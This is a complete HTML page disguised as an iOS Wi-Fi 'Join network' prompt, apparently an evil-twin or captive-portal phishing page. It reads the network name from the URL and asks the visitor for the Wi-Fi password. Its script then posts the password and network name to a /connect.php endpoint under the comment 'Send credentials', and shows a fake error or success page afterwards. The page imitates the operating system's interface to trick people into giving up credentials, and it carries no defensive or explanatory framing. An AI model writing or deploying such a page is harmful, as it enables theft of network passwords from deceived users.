<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iOS Wi-Fi Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: linear-gradient(180deg, #007AFF 0%, #5856D6 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 14px;
            padding: 30px;
            width: 100%;
            max-width: 320px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }
        
        .wifi-icon {
            text-align: center;
            font-size: 40px;
            margin-bottom: 15px;
        }
        
        .network-name {
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            color: #000;
            margin-bottom: 5px;
        }
        
        .login-subtitle {
            text-align: center;
            font-size: 13px;
            color: #666;
            margin-bottom: 25px;
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        .input-group label {
            display: block;
            font-size: 12px;
            color: #666;
            margin-bottom: 5px;
            font-weight: 500;
        }
        
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        .input-group input:focus {
            border-color: #007AFF;
        }
        
        .input-group input::placeholder {
            color: #999;
        }
        
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #007AFF;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .login-btn:hover {
            background: #0066dd;
        }
        
        .footer-text {
            text-align: center;
            font-size: 11px;
            color: #999;
            margin-top: 20px;
        }
        
        .show-password {
            display: flex;
            align-items: center;
            margin-top: 8px;
        }
        
        .show-password input {
            margin-right: 8px;
        }
        
        .show-password label {
            font-size: 12px;
            color: #666;
        }
        
        .error-msg {
            color: #ff3b30;
            font-size: 12px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        
        .error-msg.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="wifi-icon">ðŸ“¶</div>
        <div class="network-name" id="ssid">Join "Network"</div>
        <div class="login-subtitle">Enter your password to connect to the Wi-Fi network</div>
        
        <form id="loginForm" method="POST" action="/connect.php">
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" id="password" placeholder="Password" required autocomplete="current-password">
            </div>
            
            <div class="show-password">
                <input type="checkbox" id="showPassword">
                <label for="showPassword">Show Password</label>
            </div>
            
            <button type="submit" class="login-btn">Join</button>
            
            <div class="error-msg" id="errorMsg">Incorrect password. Please try again.</div>
        </form>
        
        <div class="footer-text">
            This network requires a password to access the internet.
        </div>
    </div>

    <script>
        document.getElementById('showPassword').addEventListener('change', function() {
            const passwordInput = document.getElementById('password');
            passwordInput.type = this.checked ? 'text' : 'password';
        });
        
        // Get SSID from URL if provided
        const urlParams = new URLSearchParams(window.location.search);
        const ssid = urlParams.get('ssid') || 'Wi-Fi Network';
        document.getElementById('ssid').textContent = 'Join "' + ssid + '"';
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            
            // Send credentials
            fetch('/connect.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'password=' + encodeURIComponent(password) + '&ssid=' + encodeURIComponent(ssid)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Redirect to success
                    window.location.href = '/success.html';
                } else {
                    document.getElementById('errorMsg').classList.add('show');
                }
            })
            .catch(() => {
                document.getElementById('errorMsg').classList.add('show');
            });
        });
    </script>
</body>
</html>
